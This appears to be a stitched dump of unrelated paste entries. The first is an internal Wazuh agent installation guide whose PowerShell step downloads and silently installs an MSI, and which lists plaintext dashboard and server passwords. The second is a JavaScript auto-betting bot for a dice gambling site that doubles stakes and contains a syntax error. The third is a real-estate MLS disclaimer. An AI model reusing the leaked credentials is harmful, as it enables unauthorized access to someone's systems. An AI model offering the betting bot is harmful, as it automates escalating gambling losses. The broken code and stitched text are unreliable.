---------------------------------------------------------------------------------------
command 1: $whoami=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
---------------------------------------------------------------------------------------
Explanation 1: The command1 is to identify the username of the account, if the powershell did not acknowledge the $whoami value then we have to manually input the username of the AD account it must follow this format example only if username is User Test: 'IS6_U_Test'
note: must include quotation marks ''

---------------------------------------------------------------------------------------
command 2: Invoke-WebRequest -Uri https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.2-1.msi -OutFile ${env.tmp}\wazuh-agent; msiexec.exe /i ${env.tmp}\wazuh-agent /q WAZUH_MANAGER='10.1.113.214' WAZUH_AGENT_GROUP='default' WAZUH_AGENT_NAME=$whoami WAZUH_REGISTRATION_SERVER='10.1.113.214'
---------------------------------------------------------------------------------------
If you encountered Explanation 1: then replace the $whoami at command2 following the format username
sample:
WAZUH_AGENT_NAME='IS6_U_Test'

------------------------
command 3: net start WazuhSvc
------------------------
This is for starting the wazuh-agent service


3. Check the wazuh dashboard for verification
https://10.1.113.214
password: R5pSJynpYwRfFR6yfC5cX7uH+Ds*LU0J


----------------
Troubleshooting
----------------
If the wazuh dashboard displays an error  (eg. API error)
goto IWU and open the ubuntu server
username: wazuh.server
password: 1wu@W4zuH!~
1. 
Open terminal and type command: sudo su
press enter
enter the wazuh.server password

2.
Once we have entered the correct password then
type command: systemctl restart wazuh-manager
this is to start/restart the wazuh-manager if suddenly the server has shutdown or encountered an issue

3. Check the status of wazuh-manager
systemctl status wazuh-manager
If the output is active/running then proceed on installing an agent


If the wazuh-agent has been installed and the user device is not listed on the active agents
then we have to remove the current agent installed and reinstall it

1. Easy way is to download the agent installer:
https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html

after installation, open it and click remove.
Repeat the installation process through the powershell again.

Optional:
2. Manual removal of agent to the wazuh-server
To uninstall the agent, the original Windows installer file is required to perform the unattended process:

msiexec.exe /x wazuh-agent-4.7.2-1.msi /qn
The Wazuh agent is now completely removed from your Windows endpoint.
"
uvRf8gDV,snowybot handbreaker bot,coinwalk,JavaScript,Thursday 25th of January 2024 06:38:24 PM CDT,"var oldestbal = parseFloat(document.getElementById('pct_balance').value);
var base = Number((oldestbal/144).toFixed(8));
var bellance = oldestbal;
var dodgey = oldestbal;
var kitty = oldestbal;
var botplus = base;
var trget = oldestbal;
var tens = (base*10);
var sevens = (base*6.9);
var eights = (base*7.9);
var upper = 6.9;
var downer = 2.9;
var fart = ((Math.floor(oldestbal/tens))*tens);
var bob = oldestbal;
var boobed = oldestbal;
var troll = true;


function get(){
dodgey = document.getElementById('pct_balance').value;
if (dodgey>kitty){
bellance = bellance+botplus
kitty = parseFloat(dodgey);
}
if (dodgey<kitty){
bellance = bellance-botplus
kitty = parseFloat(dodgey);
}
var good = ((bellance-oldestbal).toFixed(8));
console.log(""profit"");
console.log(good);
if (bellance>(fart+(botplus*upper))){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
    fart = parseFloat(bellance);
}
if ((bellance<(fart-(botplus*downer)))&&(troll)){
    botplus = botplus*2;
    upper = 4.9;
    downer = 4.9;
	troll = false;
    fart = parseFloat(bellance);
}
if ((bellance<(fart-(botplus*downer)))&&(!troll))[
    upper = 4.9;
    downer = 4.9;
	troll = false;
    fart = parseFloat(bellance);
}
if (bellance>bob){
   bob = parseFloat(bellance);
   }
if ((bellance<=(bob-(botplus*3.9)))&&(botplus>=(base*3.9))&&(bellance>=boobed)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
	troll = true;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
    boobed = parseFloat(bellance);
}
if ((botplus>=tens)&&(bellance<(((Math.floor(bellance/tens))*tens)+sevens))){
    botplus = base;
    upper = 6.9;
    downer = 2.9;
	troll = true;
    fart = ((Math.floor(bellance/tens))*tens);
    bob = parseFloat(bellance);
    boobed = parseFloat(bellance);
}
if (bellance>=100) {
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((botplus*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => get(), 10);
}
get();
"
kckcP0P1,nwmls footer disclaimer,janusivan,HTML 5,Thursday 25th of January 2024 06:31:11 PM CDT,"<p>The IDX display contains information sourced from the Northwest Multiple Listing Service. This data is intended solely for personal, non-commercial use and is not to be utilized for any other purposes except to identify potential properties for purchase. Although the MLS data displayed is typically considered reliable, it is not guaranteed to be accurate by the MLS. Buyers are responsible for verifying the accuracy of all information and are advised to conduct their own investigations or seek professional assistance. Other sources besides the Listing Agent may have contributed to the MLS data presented. Unless expressly specified in writing, the Broker/Agent has not confirmed any information obtained from external sources. The Broker/Agent may or may not have acted as the Listing and/or Selling Agent and cannot guarantee the accuracy of property locations displayed on any map. Any compensation offers are solely made to participants of the MLS where the listing is registered.<br /><br />&copy;<span class=""auto-year-update"">#</span> Northwest Multiple Listing Service all rights reserved.<img src=""https://res.cloudinary.com/luxuryp/images/f_auto,q_auto/pv3nzs2ntl6l765u6u0g/symbol-color-nwmls"" alt="""" width=""25"" height=""auto"" /></p>"
